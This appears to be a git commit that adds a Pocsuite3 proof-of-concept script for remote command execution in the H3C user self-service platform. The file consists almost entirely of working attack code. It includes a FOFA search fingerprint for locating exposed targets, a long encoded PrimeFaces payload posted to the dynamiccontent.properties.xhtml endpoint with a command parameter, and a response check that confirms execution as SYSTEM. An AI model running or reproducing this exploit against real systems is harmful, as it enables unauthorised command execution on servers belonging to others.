f7c94f5eb9548a23b5690ad6be7f3041b39e2f10
test <test>
2025-01-25 17:27:22 +0800

    from https://github.com/dddinmx/POC-Pocsuite3

---
+++ poc/H3C 用户自助服务平台dynamiccontent.properties.xhtml RCE漏洞.py
@@ -0,0 +1,60 @@
+# -*- coding:utf-8 -*-
+
+from collections import OrderedDict
+from pocsuite3.api import Output, POCBase, register_poc, requests, OptString
+
+class DemoPOC(POCBase):
+    vulID = ""
+    version ='1'
+    author = ["LMX"]
+    vulDate = "2024"
+    createDate = "2024-3-21"
+    updateDate = "2024-3-21"
+    references =[]
+    name ="H3C 用户自助服务平台 RCE漏洞"
+    appPowerLink = ''
+    appName = 'H3C 用户自助服务平台'
+    appVersion = ''
+    vulType = 'RCE'
+    desc = '''
+    fofa:fid="tPmVs5PL6e9m5Xt0J4V2+A=="
+    '''
+
+    def _options(self):
+        o = OrderedDict()
+        o["command"] = OptString("whoami", description="攻击时自定义命令")
+        return o
+
+    def _verify(self):
+        result ={}
+        urlparts = self.url
+        parts = urlparts.split('/')
+        urlresult = '/'.join(parts[:3])
+        url = str(urlresult) + '/mselfservice/javax.faces.resource/dynamiccontent.properties.xhtml'
+        headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+        payload = '''pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=whoami'''
+        r = requests.post(url=url,headers=headers,data=payload,verify=False,timeout=5)
+        try:
+            if r.status_code == 200 and 'authority\system' in r.text:
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = url+"\n"+r.text
+        except Exception as e:
+            pass
+        return self.parse_output(result)
+
+    def parse_output(self, result):
+        output = Output(self)
+        if result:
+            output.success(result)
+        else:
+            output.fail('target is not vulnerable')
+        return output
+
+    def _attack(self):
+        result = {}
+        return self.parse_output(result)
+        
+register_poc(DemoPOC) 
